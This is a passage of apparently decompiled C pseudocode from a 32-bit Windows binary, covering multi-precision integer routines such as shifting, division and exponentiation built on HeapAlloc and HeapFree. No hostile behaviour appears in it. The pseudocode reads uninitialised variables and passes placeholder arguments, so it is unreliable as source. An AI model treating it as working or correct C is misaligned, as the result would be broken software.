        v11 = &v15;
        v12 = v17;
        if ((v19 < 0 ? -v19 : v19) > v14) {
            // 0x4031f8
            *v18 = 0;
            v11 = &v15;
            v12 = v17;
        }
    }
    int32_t v20 = *(int32_t *)(v1 + 8); // 0x40320b
    int32_t v21; // 0x403170
    if (v5 == 0) {
        // 0x403236
        v21 = v9;
        if (v3 >= 1) {
            int32_t v22 = v12 + 4 * v8; // 0x403240
            v22 -= 4;
            int32_t v23 = v3 - 1; // 0x40324a
            *(int32_t *)v22 = *(int32_t *)(v20 - 4 + 4 * v3);
            v21 = v9;
            while (v23 >= 0 == (v23 != 0)) {
                int32_t v24 = v23;
                v22 -= 4;
                v23 = v24 - 1;
                *(int32_t *)v22 = *(int32_t *)(v20 - 4 + 4 * v24);
                v21 = v9;
            }
        }
    } else {
        int32_t v25 = (int32_t)v11;
        *(int32_t *)(v25 - 4) = v5;
        *(int32_t *)(v25 - 8) = v3;
        int32_t v26 = function_4020b0(v20, (int32_t)&g266); // 0x40321c
        *(int32_t *)(4 * v9 - 4 + v12) = v26;
        v21 = v9 - (int32_t)(v26 == 0);
    }
    int32_t v27 = v21;
    int32_t v28 = v6; // 0x403256
    int32_t result2; // 0x40327c
    if (a1 < 32) {
        // 0x40326c
        result2 = *v2 >= 0 ? v27 : -v27;
        *(int32_t *)(v4 + 4) = result2;
        return result2;
    }
    v28--;
    *(int32_t *)(4 * v28 + v12) = 0;
    while (v28 >= 0 == (v28 != 0)) {
        // 0x403260
        v28--;
        *(int32_t *)(4 * v28 + v12) = 0;
    }
    // 0x40326c
    result2 = *v2 >= 0 ? v27 : -v27;
    *(int32_t *)(v4 + 4) = result2;
    return result2;
}

// Address range: 0x403290 - 0x4034e5
int32_t function_403290(int32_t * a1, int32_t * a2) {
    int32_t v1 = *(int32_t *)((int32_t)a1 + 4); // 0x4032a9
    int32_t v2; // 0x403290
    int32_t v3; // 0x403290
    if (v1 == 0) {
        if (v3 != 0) {
            // 0x4032b7
            *(int32_t *)(v3 + 4) = v1;
        }
        // 0x4032ba
        if (v2 != 0) {
            // 0x4032be
            *(int32_t *)(v2 + 4) = 0;
        }
        // 0x4032c5
        return 0;
    }
    int32_t v4 = (int32_t)a2;
    int32_t v5 = *(int32_t *)(v4 + 4); // 0x4032a0
    int32_t v6 = v1 < 0 ? -v1 : v1; // 0x4032d3
    int32_t v7 = v5 < 0 ? -v5 : v5; // 0x4032e5
    if (v6 < v7) {
        if (v2 != 0) {
            // 0x4032f0
            function_402cd0();
        }
        // 0x4032f9
        if (v3 != 0) {
            // 0x4032fd
            *(int32_t *)(v3 + 4) = 0;
        }
        // 0x4032c5
        return 1;
    }
    int32_t * hHeap = GetProcessHeap(); // 0x403322
    int32_t v8 = (int32_t)hHeap; // bp-100, 0x403328
    int32_t v9 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x403329
    function_402cd0();
    int32_t v10 = v6 - v7; // 0x403340
    int32_t v11 = 1; // 0x40334d
    int32_t v12 = 0; // 0x40334d
    int32_t * v13 = &v8; // 0x40334d
    if (v3 != 0) {
        int32_t v14 = 32 * v10 + 32; // 0x403354
        int32_t * hHeap2 = GetProcessHeap(); // 0x403374
        int32_t v15 = (int32_t)hHeap2; // bp-112, 0x40337a
        v12 = (int32_t)HeapAlloc(hHeap2, (int32_t)&g266, (int32_t)&g266);
        v11 = (v14 - (int32_t)(v14 != 0)) / 32 + 1;
        v13 = &v15;
    }
    int32_t v16 = (int32_t)v13;
    int32_t * v17 = (int32_t *)(v16 - 4);
    *v17 = v7;
    function_4023f0(v12);
    int32_t * v18 = v17; // 0x4033c1
    int32_t v19 = *(int32_t *)(v4 + 8); // 0x4033c1
    int32_t v20 = v16; // 0x4033c1
    int32_t v21; // bp-72, 0x403290
    if (v7 >= 3 && v21 != 0) {
        // 0x4033c9
        *v17 = 4 * v7;
        *(int32_t *)(v16 - 8) = 8;
        int32_t * v22 = GetProcessHeap(); // 0x4033d3
        v20 = v16 - 12;
        *(int32_t *)v20 = (int32_t)v22;
        v19 = (int32_t)HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266);
        v18 = (int32_t *)(v16 - 16);
        *v18 = v21;
        *(int32_t *)(v16 - 20) = v7;
        function_4020b0(v19, (int32_t)&g266);
    }
    // 0x4033fc
    *v18 = (int32_t)&v21;
    int32_t * v23 = (int32_t *)(v20 - 8); // 0x403403
    *v23 = v7;
    int32_t * v24 = (int32_t *)(v20 - 12); // 0x403404
    *v24 = v19;
    *(int32_t *)(v20 - 16) = v6;
    function_402bd0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    if (v19 != 0) {
        // 0x40341a
        *v18 = v19;
        *v23 = 0;
        *v24 = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    int32_t v25 = 0; // 0x40342f
    if (v12 != 0) {
        int32_t v26 = v10 + (int32_t)(*(int32_t *)(v12 + 4 * v10) != 0); // 0x40343d
        v25 = (v1 ^ v5) >= 0 ? v26 : -v26;
    }
    int32_t v27 = v7; // 0x40344f
    if (v7 >= 1) {
        int32_t v28 = 4 * v7 + v9; // 0x40345a
        int32_t v29 = v7; // 0x40345a
        v28 -= 4;
        v27 = v29;
        while (*(int32_t *)v28 == 0) {
            // 0x403465
            v29--;
            v27 = v29;
            if (v29 >= 0 != v29 != 0) {
                // break -> 0x40346d
                break;
            }
            v28 -= 4;
            v27 = v29;
        }
    }
    int32_t v30 = v27;
    int32_t v31 = v20; // 0x403481
    if (v3 != 0) {
        // 0x403483
        *(int32_t *)v3 = v11;
        int32_t * v32 = (int32_t *)(v3 + 8); // 0x403488
        *(int32_t *)(v3 + 4) = v25;
        *(int32_t *)(v20 - 4) = *v32;
        *v32 = v12;
        *(int32_t *)(v20 - 8) = 0;
        int32_t * v33 = GetProcessHeap(); // 0x40349d
        v31 = v20 - 12;
        *(int32_t *)v31 = (int32_t)v33;
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    int32_t v34 = v9; // 0x4034b0
    if (v2 != 0) {
        int32_t * v35 = (int32_t *)(v2 + 8); // 0x4034b5
        v34 = *v35;
        *(int32_t *)(v2 + 4) = v1 >= 0 ? v30 : -v30;
        *(int32_t *)v2 = 1;
        *v35 = v9;
    }
    // 0x4034cb
    *(int32_t *)(v31 - 4) = v34;
    *(int32_t *)(v31 - 8) = 0;
    *(int32_t *)(v31 - 12) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    return v30 != 0;
}

// Address range: 0x4034f0 - 0x4035a3
int32_t function_4034f0(uint32_t a1) {
    // 0x4034f0
    int32_t v1; // 0x4034f0
    uint32_t result = *(int32_t *)(v1 + 4); // 0x4034fe
    int32_t v2; // 0x4034f0
    if (result == 0) {
        // 0x403508
        *(int32_t *)(v2 + 4) = result;
        return result;
    }
    uint32_t v3 = a1 / 32; // 0x40351a
    int32_t v4 = (result < 0 ? -result : result) - v3; // 0x403527
    int32_t v5; // 0x4034f0
    if (v4 >= 0 != v4 != 0) {
        // 0x40358e
        v5 = 0;
        *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
        return result;
    }
    int32_t v6 = a1 & 31; // 0x403524
    int32_t v7; // 0x4034f0
    if (v4 > v6) {
        // 0x403538
        v7 = function_402c80();
    } else {
        // 0x403548
        v7 = *(int32_t *)(v2 + 8);
    }
    // 0x40354b
    if (v6 != 0) {
        // 0x40355b
        function_402130(v4, v6);
        int32_t result2 = *(int32_t *)(4 * v4 - 4 + v7) == 0; // 0x40356d
        // 0x40358e
        v5 = v4 - result2;
        *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
        return result2;
    }
    int32_t result3 = *(int32_t *)(v1 + 8); // 0x403551
    if (v4 < 1) {
        // 0x40358e
        v5 = v4;
        *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
        return result3;
    }
    int32_t v8 = v4; // 0x40357c
    int32_t v9 = v7; // 0x40357c
    int32_t result4 = *(int32_t *)(4 * v3 - v7 + result3 + v9); // 0x403580
    *(int32_t *)v9 = result4;
    v8--;
    v9 += 4;
    while (v8 != 0) {
        // 0x403580
        result4 = *(int32_t *)(4 * v3 - v7 + result3 + v9);
        *(int32_t *)v9 = result4;
        v8--;
        v9 += 4;
    }
    // 0x40358e
    v5 = v4;
    *(int32_t *)(v2 + 4) = result >= 0 ? v5 : -v5;
    return result4;
}

// Address range: 0x4035b0 - 0x403f5d
int32_t function_4035b0(int32_t a1, int32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x4035c8
    int32_t v2 = *v1; // 0x4035c8
    int32_t v3; // 0x4035b0
    int32_t v4; // 0x4035b0
    if (v2 == 0) {
        if (v4 != a2) {
            // 0x4035d9
            function_402cd0();
        }
        int32_t * v5 = (int32_t *)(v4 + 4); // 0x4035e0
        int32_t v6 = *v5; // 0x4035e0
        int32_t result = v6 < 0 ? -v6 : v6; // 0x4035e6
        *v5 = result;
        if (v3 == 0) {
            // 0x403f56
            return result;
        }
        // 0x4035f3
        *(int32_t *)(v3 + 4) = 0;
        return result;
    }
    // 0x403601
    if (*(int32_t *)(a2 + 4) == 0) {
        if (v4 != a1) {
            // 0x40361a
            function_402cd0();
        }
        int32_t * v7 = (int32_t *)(v4 + 4); // 0x403621
        int32_t v8 = *v7; // 0x403621
        int32_t result2 = v8 < 0 ? -v8 : v8; // 0x403627
        *v7 = result2;
        if (v3 == 0) {
            // 0x403f56
            return result2;
        }
        int32_t v9 = (int32_t)(v2 >= 0) - (int32_t)(v2 < 0); // 0x403614
        if (v9 < 0) {
            int32_t result3 = *(int32_t *)(v3 + 8); // 0x40364d
            *(int32_t *)(v3 + 4) = -1;
            *(int32_t *)result3 = -v9;
            return result3;
        }
        // 0x403638
        if (v9 == 0) {
            // 0x4035f3
            *(int32_t *)(v3 + 4) = 0;
            return result2;
        }
        int32_t result4 = *(int32_t *)(v3 + 8); // 0x40363a
        *(int32_t *)(v3 + 4) = 1;
        *(int32_t *)result4 = v9;
        return result4;
    }
    int32_t v10 = 1; // bp-88, 0x40366c
    int32_t * v11 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x403683
    int32_t v12 = 1; // bp-76, 0x40368c
    int32_t * v13 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x40369d
    int32_t * v14 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4036b5
    int32_t v15 = 1; // bp-100, 0x4036c3
    int32_t * v16 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4036d3
    int32_t * v17 = HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266); // 0x4036ef
    int32_t v18 = 1; // bp-112, 0x4036f8
    int32_t * hHeap = GetProcessHeap(); // 0x403702
    int32_t v19 = (int32_t)hHeap; // bp-200, 0x403708
    int32_t * v20 = HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266); // 0x403709
    if ((int32_t)&v10 != a1) {
        // 0x403718
        function_402cd0();
    }
    int32_t v21 = (int32_t)v11; // 0x403683
    int32_t v22 = *v11; // 0x403730
    int32_t v23 = 0; // 0x403734
    int32_t v24 = 0; // 0x403734
    int32_t v25 = v22; // 0x403734
    int32_t v26; // 0x4035b0
    if (v22 != 0) {
      lab_0x403746:;
        int32_t v27 = v25;
        int32_t v28 = v27 & -v27; // 0x40374a
        int32_t v29 = v28; // 0x403753
        int32_t v30 = 0; // 0x403753
        if (v28 < 0x1000000) {
            int32_t v31 = v28;
            int32_t v32 = 256 * v31; // 0x403755
            int32_t v33 = 8; // 0x403758
            int32_t v34 = v33; // 0x403760
            v29 = v32;
            v30 = v33;
            while ((v31 & 0xff0000) == 0) {
                // 0x403755
                v31 = v32;
                v32 = 256 * v31;
                v33 = v34 + 8;
                v34 = v33;
                v29 = v32;
                v30 = v33;
            }
        }
        int32_t v35 = v30; // 0x403764
        if (v29 >= 0) {
            int32_t v36 = v30 + 1; // 0x403766
            int32_t v37 = 2 * v29; // 0x403767
            int32_t v38 = v37; // 0x403769
            int32_t v39 = v36; // 0x403769
            v35 = v36;
            while (v37 >= 0) {
                // 0x403766
                v36 = v39 + 1;
                v37 = 2 * v38;
                v38 = v37;
                v39 = v36;
                v35 = v36;
            }
        }
        // 0x40376b
        v26 = (32 * v24 | 31) - v35;
    } else {
        v23++;
        v26 = -1;
        while (v23 != 0) {
            int32_t v40 = *(int32_t *)(4 * v23 + v21); // 0x40373f
            v24 = v23;
            v25 = v40;
            if (v40 != 0) {
                goto lab_0x403746;
            }
            v23++;
            v26 = -1;
        }
    }
    uint32_t v41 = v26;
    function_4034f0(v41);
    int32_t v42 = &v12; // 0x403785
    if (v42 != a2) {
        // 0x40378f
        function_402cd0();
    }
    int32_t v43 = (int32_t)v13; // 0x40369d
    int32_t v44 = *v13; // 0x4037a7
    int32_t v45 = 0; // 0x4037ab
    int32_t v46 = v44; // 0x4037ab
    int32_t v47 = 31; // 0x4037ab
    int32_t v48; // 0x4035b0
    if (v44 != 0) {
        goto lab_0x4037c0_2;
    } else {
        v45++;
        v48 = -1;
        while (v45 != 0) {
            // 0x4037b9
            v46 = *(int32_t *)(4 * v45 + v43);
            if (v46 != 0) {
                // 0x4037c0
                v47 = 32 * v45 | 31;
                goto lab_0x4037c0_2;
            }
            v45++;
            v48 = -1;
        }
        goto lab_0x4037ee;
    }
  lab_0x4037c0_2:;
    int32_t v49 = v46;
    int32_t v50 = v49 & -v49; // 0x4037c4
    int32_t v51 = v50; // 0x4037cd
    int32_t v52 = 0; // 0x4037cd
    if (v50 < 0x1000000) {
        int32_t v53 = v50;
        int32_t v54 = 256 * v53; // 0x4037d0
        int32_t v55 = 8; // 0x4037d3
        int32_t v56 = v55; // 0x4037db
        v51 = v54;
        v52 = v55;
        while ((v53 & 0xff0000) == 0) {
            // 0x4037d0
            v53 = v54;
            v54 = 256 * v53;
            v55 = v56 + 8;
            v56 = v55;
            v51 = v54;
            v52 = v55;
        }
    }
    int32_t v57 = v52; // 0x4037df
    if (v51 >= 0) {
        int32_t v58 = v52 + 1; // 0x4037e1
        int32_t v59 = 2 * v51; // 0x4037e2
        int32_t v60 = v59; // 0x4037e4
        int32_t v61 = v58; // 0x4037e4
        v57 = v58;
        while (v59 >= 0) {
            // 0x4037e1
            v58 = v61 + 1;
            v59 = 2 * v60;
            v60 = v59;
            v61 = v58;
            v57 = v58;
        }
    }
    // 0x4037e6
    v48 = v47 - v57;
    goto lab_0x4037ee;
  lab_0x4037ee:;
    uint32_t v62 = v48;
    function_4034f0(v62);
    if (function_4043d0() == 0) {
        // 0x403865
        function_404440();
    }
    int32_t v63 = v41 < v62 ? v41 : v62; // 0x403807
    int32_t v64 = v41 - v63; // 0x40380a
    function_403290(&v10, &v12);
    function_403170(v64);
    if (function_4043d0() == 0) {
        // 0x4038a7
        function_404440();
    }
    int32_t v65 = &v19; // 0x403896
    int32_t v66 = v64 + v62 - v63; // 0x4038ba
    int32_t * v67 = (int32_t *)(v65 - 4); // 0x403c2a
    *v67 = v63;
    function_403170((int32_t)&g266);
    int32_t * v68 = (int32_t *)(v65 - 8); // 0x403c3d
    *v68 = v42;
    int32_t * v69 = (int32_t *)(v65 - 12); // 0x403c3e
    *v69 = a2;
    function_403290(NULL, &g266);
    int32_t v70 = &v15; // 0x403c63
    *v67 = v70;
    *v68 = v42;
    *v69 = a1;
    function_403290(NULL, &g266);
    if (v66 != 0) {
        int32_t v71 = v66 - 1; // 0x403c9a
        int32_t v72 = v71; // 0x403dc9
        while (v71 != 0) {
            // 0x403dc1
            v71 = v72 - 1;
            v72 = v71;
        }
    }
    int32_t v73 = (int32_t)v14; // 0x4036b5
    int32_t v74 = (int32_t)v16; // 0x4036d3
    *v67 = v70;
    int32_t v75 = function_402d60((int32_t)&g266); // 0x403ddf
    int32_t v76 = v75 < 0 ? -v75 : v75; // 0x403e0b
    int32_t v77 = 1; // 0x403e1e
    int32_t v78 = v73; // 0x403e1e
    int32_t v79 = v74; // 0x403e1e
    int32_t v80 = 0; // 0x403e1e
    if (v76 != 0) {
        int32_t v81 = -v76; // 0x403e22
        v77 = 1;
        v78 = v73;
        v79 = v74;
        v80 = 0;
        if (v81 < 0 == (v76 & v81) < 0) {
            // 0x403e87
            *v67 = (int32_t)&v18;
            function_402e90(v15);
            v77 = v15;
            v78 = v74;
            v79 = v73;
            v80 = v75;
        }
    }
    int32_t v82 = v80;
    *(int32_t *)(v4 + 4) = 0;
    *(int32_t *)v4 = v12;
    int32_t * v83 = (int32_t *)(v4 + 8); // 0x403ecf
    *v83 = v43;
    int32_t v84 = v78; // 0x403ee0
    if (v3 != 0) {
        // 0x403ee2
        *(int32_t *)(v3 + 4) = *v1 >= 0 ? v82 : -v82;
        int32_t * v85 = (int32_t *)(v3 + 8); // 0x403ee8
        *(int32_t *)v3 = v77;
        *v85 = v78;
        v84 = *v85;
    }
    // 0x403f10
    *v67 = v21;
    *v68 = 0;
    *v69 = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 16) = *v83;
    *(int32_t *)(v65 - 20) = 0;
    *(int32_t *)(v65 - 24) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 28) = v84;
    *(int32_t *)(v65 - 32) = 0;
    *(int32_t *)(v65 - 36) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 40) = v79;
    *(int32_t *)(v65 - 44) = 0;
    *(int32_t *)(v65 - 48) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 52) = (int32_t)v17;
    *(int32_t *)(v65 - 56) = 0;
    *(int32_t *)(v65 - 60) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v65 - 64) = (int32_t)v20;
    *(int32_t *)(v65 - 68) = 0;
    *(int32_t *)(v65 - 72) = (int32_t)GetProcessHeap();
    // 0x403f56
    return HeapFree(&g266, (int32_t)&g266, &g266);
}

// Address range: 0x403f60 - 0x4040af
int32_t function_403f60(int32_t a1) {
    // 0x403f60
    int32_t v1; // 0x403f60
    if (*(int32_t *)(v1 + 4) == 0) {
        // 0x4040a6
        return 0;
    }
    int32_t v2 = *(int32_t *)(a1 + 4); // 0x403f80
    uint32_t v3 = v2 < 0 ? -v2 : v2; // 0x403f86
    if (v3 <= 1) {
        int32_t v4 = 0; // 0x403f8c
        if (v3 == 1) {
            // 0x403f8e
            v4 = *(int32_t *)*(int32_t *)(a1 + 8);
        }
        uint32_t v5 = v4;
        if (v5 > 1 <= (v5 == 0)) {
            // 0x4040a6
            return 0;
        }
    }
    // 0x403fae
    HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266);
    HeapAlloc(GetProcessHeap(), (int32_t)&g266, (int32_t)&g266);
    function_4035b0(1, v1, a1);
    HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
    HeapFree(GetProcessHeap(), (int32_t)&g266, &g266);
    return 0;
}

// Address range: 0x4040b0 - 0x4043cb
int32_t function_4040b0(int32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)(a1 + 4); // 0x4040c7
    int32_t v2 = *v1; // 0x4040c7
    int32_t v3 = v2 < 0 ? -v2 : v2; // 0x4040d4
    int32_t v4; // 0x4040b0
    if (v3 == 0) {
        // 0x4040e4
        *(int32_t *)(v4 + 4) = 1;
        int32_t result = *(int32_t *)(v4 + 8); // 0x4040ee
        *(int32_t *)result = 1;
        return result;
    }
    int32_t v5 = *(int32_t *)(a2 + 4); // 0x4040cf
    int32_t v6 = v5 < 0 ? -v5 : v5; // 0x4040de
    function_4023f0(v6);
    int32_t v7; // bp-68, 0x4040b0
    int32_t v8 = v7; // 0x40410f
    int32_t v9 = *(int32_t *)(a2 + 8); // 0x404120
    int32_t v10; // bp-84, 0x4040b0
    int32_t * v11 = &v10; // 0x404120
    if (v8 != 0) {
        // 0x404122
        v7 = 0;
        int32_t * hHeap = GetProcessHeap(); // 0x404131
        int32_t v12 = (int32_t)hHeap; // bp-96, 0x404133
        v9 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
        function_4020b0(v6, v8);
        v11 = &v12;
    }
    int32_t v13 = (int32_t)v11;
    *(int32_t *)(v13 - 4) = 4;
    int32_t v14 = 1; // bp-40, 0x40415d
    *(int32_t *)(v13 - 8) = 8;
    *(int32_t *)(v13 - 12) = (int32_t)GetProcessHeap();
    int32_t v15 = (int32_t)HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x40416c
    int32_t v16 = &v14; // 0x40417b
    int32_t * v17; // 0x4040b0
    if (*v1 > -1) {
        int32_t v18; // 0x4040b0
        if (v18 != v16) {
            // 0x404196
            function_402cd0();
        }
        int32_t v19 = 0; // 0x4041b1
        if (v6 <= 0) {
            // 0x4041b3
            *(int32_t *)(v13 - 16) = (int32_t)&v7;
            *(int32_t *)(v13 - 20) = v6;
            *(int32_t *)(v13 - 24) = v9;
            *(int32_t *)(v13 - 28) = 0;
            function_402bd0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v19 = v6;
        }
        // 0x4041ca
        if (*(int32_t *)(v18 + 4) >= 0) {
            // 0x4041ca
            v17 = (int32_t *)(v13 - 16);
        } else {
            int32_t v20 = v15; // 0x4041d3
            if (v6 > v14) {
                // 0x4041d5
                v20 = function_402c80();
            }
            int32_t * v21 = (int32_t *)(v13 - 16);
            *v21 = v19;
            *(int32_t *)(v13 - 20) = v20;
            *(int32_t *)(v13 - 24) = v6;
            function_401d90((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            v17 = v21;
            if (v6 >= 1) {
                int32_t v22 = 4 * v6 - 4 + v15; // 0x40420a
                int32_t v23 = v6; // 0x40420a
                v17 = v21;
                while (*(int32_t *)v22 == 0) {
                    // 0x404215
                    v23--;
                    v22 -= 4;
                    v17 = v21;
                    if (v23 >= 0 != v23 != 0) {
                        // break -> 0x404220
                        break;
                    }
                    v17 = v21;
                }
            }
        }
    } else {
        int32_t * v24 = (int32_t *)(v13 - 16);
        *v24 = a2;
        function_403f60(v15);
        v17 = v24;
    }
    // 0x404220
    *v17 = 4;
    *(int32_t *)(v13 - 20) = 8;
    int32_t v25 = 1; // bp-52, 0x404224
    int32_t * v26 = GetProcessHeap(); // 0x40422b
    int32_t v27 = v13 - 24; // 0x404231
    *(int32_t *)v27 = (int32_t)v26;
    int32_t * v28 = HeapAlloc(&g266, (int32_t)&g266, (int32_t)&g266); // 0x404232
    int32_t v29 = (int32_t)v28; // 0x404232
    *v28 = 1;
    int32_t v30 = v27; // 0x40424c
    int32_t v31 = 1; // 0x40424c
    int32_t v32; // 0x4040b0
    int32_t v33; // 0x4040b0
    int32_t v34; // 0x4040b0
    int32_t v35; // 0x4040b0
    int32_t v36; // 0x4040b0
    uint32_t v37; // 0x4040b0
    int32_t v38; // 0x4040b0
    int32_t v39; // 0x4040b0
    int32_t v40; // 0x4040b0
    if (v3 >= 1) {
        int32_t v41 = &v7;
        int32_t v42 = 1; // 0x4040b0
        int32_t v43 = v3; // 0x404255
        int32_t v44 = v27; // 0x4040b0
        while (true) {
            // 0x404252
            v43--;
            v38 = v42;
            v36 = -0x80000000;
            v34 = v44;
            while (true) {
              lab_0x404273:;
                int32_t v45 = v34;
                v37 = v36;
                int32_t v46 = v38;
                int32_t * v47 = (int32_t *)(v45 - 4); // 0x404276
                *v47 = (int32_t)&v25;
                function_403080(v37);
                if ((v37 & *(int32_t *)(*(int32_t *)(a1 + 8) + 4 * v43)) != 0) {
                    // 0x404288
                    *v47 = v16;
                    function_403080((int32_t)&g266);
                }
                // 0x404299
                v39 = v46;
                v32 = v45;
                if (v46 > v6) {
                    if (v6 != 1) {
                        if (v6 != 2) {
                            int32_t v48 = v7; // 0x4042d7
                            int32_t v49; // 0x4040b0
                            int32_t * v50; // 0x4040b0
                            int32_t v51; // 0x4040b0
                            if (v48 == 0) {
                                int32_t v52 = v45 - 8; // 0x4042f7
                                v50 = (int32_t *)v52;
                                v49 = v52;
                                v51 = 0;
                            } else {
                                // 0x4042de
                                *v47 = v48;
                                int32_t v53 = v45 - 8;
                                int32_t * v54 = (int32_t *)v53;
                                *v54 = v46;
                                int32_t v55 = function_4020b0((int32_t)&g266, (int32_t)&g266); // 0x4042e4
                                v50 = v54;
                                v49 = v53;
                                v51 = v55;
                            }
                            int32_t v56 = v49;
                            int32_t * v57 = v50;
                            *v57 = v6;
                            *(int32_t *)(v45 - 12) = v9;
                            *(int32_t *)(v45 - 16) = v51;
                            *(int32_t *)(v45 - 20) = v46;
                            function_402940((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                            int32_t v58 = v7; // 0x404302
                            v35 = v45;
                            if (v58 == 0) {
                                goto lab_0x40431a;
                            } else {
                                // 0x40430c
                                *v47 = v58;
                                *v57 = v6;
                                function_402130((int32_t)&g266, (int32_t)&g266);
                                // 0x404317
                                v35 = v56 + 8;
                                goto lab_0x40431a;
                            }
                        } else {
                            // 0x4042c3
                            *v47 = v41;
                            *(int32_t *)(v45 - 8) = v46;
                            *(int32_t *)(v45 - 12) = v29;
                            function_4026f0((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                            v35 = v45;
                            goto lab_0x40431a;
                        }
                    } else {
                        // 0x4042ac
                        *v47 = v41;
                        int32_t v59 = v45 - 8; // 0x4042b2
                        *(int32_t *)v59 = v46;
                        *v28 = function_4024f0((int32_t)&g266, (int32_t)&g266);
                        // 0x404317
                        v35 = v59 + 8;
                        goto lab_0x40431a;
                    }
                } else {
                    goto lab_0x404336;
                }
            }
          lab_0x40433f:
            // 0x40433f
            v42 = v40;
            v44 = v33;
            v30 = v33;
            v31 = v40;
            if (v43 >= 0 != v43 != 0) {
                // break -> 0x40434a
                break;
            }
        }
    }
    int32_t v60 = v31; // 0x40434c
    if (v31 >= v6) {
        // 0x40434e
        v7 = v8;
        *(int32_t *)(v30 - 4) = (int32_t)&v7;
        *(int32_t *)(v30 - 8) = v6;
        *(int32_t *)(v30 - 12) = v9;
        *(int32_t *)(v30 - 16) = v31;
        function_402bd0(v7, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        v60 = v6;
        if (v6 >= 1) {
            int32_t v61 = v29 - 4 + 4 * v6; // 0x404372
            int32_t v62 = v6; // 0x404372
            v60 = v62;
            while (*(int32_t *)v61 == 0) {
                // 0x40437a
                v62--;
                v61 -= 4;
                v60 = v62;
                if (v62 >= 0 != v62 != 0) {
                    // break -> 0x404382
                    break;
                }
                v60 = v62;
            }
        }
    }
    int32_t v63 = v30; // 0x40438d
    if (v9 != 0) {
        // 0x40438f
        *(int32_t *)(v30 - 4) = v9;
        *(int32_t *)(v30 - 8) = 0;
        int32_t * v64 = GetProcessHeap(); // 0x404392
        v63 = v30 - 12;
        *(int32_t *)v63 = (int32_t)v64;
        HeapFree(&g266, (int32_t)&g266, &g266);
    }
    // 0x40439b
    *(int32_t *)v4 = v25;
    int32_t * v65 = (int32_t *)(v4 + 8); // 0x4043a3
    *(int32_t *)(v63 - 4) = *v65;
    *(int32_t *)(v4 + 4) = v60;
    *(int32_t *)(v63 - 8) = 0;
    *v65 = v29;
    *(int32_t *)(v63 - 12) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)(v63 - 16) = v15;
    *(int32_t *)(v63 - 20) = 0;
    *(int32_t *)(v63 - 24) = (int32_t)GetProcessHeap();
    return HeapFree(&g266, (int32_t)&g266, &g266);
  lab_0x404336:
    // 0x404336
    v33 = v32;
    v40 = v39;
    v38 = v40;
    v36 = v37 / 2;
    v34 = v33;
    if (v37 < 2) {
        // break -> 0x40433f
        goto lab_0x40433f;
    }
    goto lab_0x404273;
  lab_0x40431a:;
    int32_t v66 = v35;
    v39 = v6;
    v32 = v66;
    if (v6 >= 1) {
        int32_t v67 = v6;
        int32_t v68 = v29 - 4 + 4 * v6; // 0x4040b0
        v39 = v67;
        v32 = v66;
        while (*(int32_t *)v68 == 0) {
            int32_t v69 = v67 - 1; // 0x40432b
            v68 -= 4;
            int32_t v70 = v69; // 0x404331
            v39 = v69;
            v32 = v66;
            if (v69 >= 0 != v69 != 0) {
                // break -> 0x404336
                break;
            }
            v67 = v70;
            v39 = v67;
            v32 = v66;
        }
    }
    goto lab_0x404336;
}

// Address range: 0x4043d0 - 0x40443c
int32_t function_4043d0(void) {
    // 0x4043d0
    int32_t v1; // 0x4043d0
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x4043d3
    uint32_t v3; // 0x4043d0
    uint32_t v4 = v3 / 32; // 0x4043df
    if (v4 >= (v2 < 0 ? -v2 : v2)) {
        // 0x4043e8
        return v2 < 0;
    }
    uint32_t v5 = v3 & 31; // 0x4043f4
    int32_t v6 = *(int32_t *)(v1 + 8) + 4 * v4; // 0x4043f7
    uint32_t v7 = *(int32_t *)v6; // 0x4043f7
    int32_t result = v7 >> v5 & 1; // 0x404401
    if (v2 >= 0) {
        // 0x40442d
        return result;
    }
    if (v5 != 0) {
        if (v7 << (-v3 & 31) != 0) {
            // 0x40442d
            return result ^ 1;
        }
    }
    int32_t v8 = v6; // 0x40441d
    if (v3 < 32) {
        // 0x40442d
        return result;
    }
    int32_t v9 = v4; // 0x40441d
    v8 -= 4;
    while (*(int32_t *)v8 == 0) {
        // 0x404429
        v9--;
